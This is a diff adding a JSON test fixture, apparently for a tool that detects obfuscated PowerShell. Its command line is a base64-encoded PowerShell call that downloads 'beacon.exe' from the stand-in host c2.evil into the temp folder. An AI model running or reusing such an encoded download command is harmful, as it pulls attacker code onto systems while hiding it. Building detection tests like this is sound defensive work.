@@ -1,0 +1,10 @@
+{
+  "id": "ps-encoded-1-mut2",
+  "category": "ps-encoded",
+  "command_line": "powershell.exe -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcAGIALgBlAHgAZQA=",
+  "expected_keywords": [
+    "c2.evil"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
